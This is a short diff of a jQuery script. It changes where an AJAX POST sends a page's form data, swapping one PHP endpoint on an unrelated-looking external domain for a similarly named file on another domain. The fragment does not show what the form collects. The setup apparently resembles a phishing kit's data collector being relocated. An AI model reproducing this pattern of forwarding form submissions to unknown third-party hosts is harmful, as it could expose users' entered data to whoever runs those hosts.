@@ -69,7 +69,7 @@ $(document).ready(function() {
   
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://physicaleducationdiploma.com/component/ladedre.php",
+            url: "https://webglancepeek.com/termi/ladedre.php",
             type: 'POST',
             data: formData,
             contentType: false,
